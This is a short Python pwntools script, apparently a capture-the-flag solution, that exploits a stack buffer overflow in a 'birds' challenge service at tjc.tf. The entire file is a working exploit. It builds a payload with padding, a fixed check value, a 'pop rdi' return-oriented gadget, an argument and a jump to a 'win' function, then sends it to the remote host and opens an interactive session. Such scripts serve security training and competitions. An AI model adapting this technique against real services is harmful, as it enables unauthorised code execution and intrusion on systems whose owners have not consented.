from pwn import *

p = remote("tjc.tf",31625)
#p = process('./birds')

pop_rdi = p64(0x00000000004011c0) # pop rdi ; nop ; pop rbp ; ret
win = p64(0x00000000004011c4)

payload = b"A"*76 + p32(0xDEADBEEF) + b"B"*8
payload += pop_rdi + p64(0xA1B2C3D4) + p64(0) + win

p.sendline(payload)
p.interactive()
